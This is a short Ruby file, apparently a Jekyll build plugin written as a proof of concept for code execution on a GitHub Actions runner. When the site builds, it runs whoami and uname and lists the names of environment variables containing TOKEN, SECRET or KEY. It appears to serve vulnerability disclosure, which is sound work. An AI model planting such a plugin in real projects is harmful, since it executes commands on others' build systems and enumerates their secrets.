```ruby
        # _plugins/verify_poc.rb
        puts "========================================"
        puts "VULNERABILITY POC - RCE CONFIRMED"
        puts "User: #{`whoami`.strip}"
        puts "Runner: #{`uname -s`.strip}"
        # Menampilkan nama variabel rahasia yang tersedia (nilainya akan di-mask oleh GitHub)
        puts "Available Secrets/Env:"
        system("env | cut -d= -f1 | grep -E 'TOKEN|SECRET|KEY' || true")
        puts "========================================"
        ```
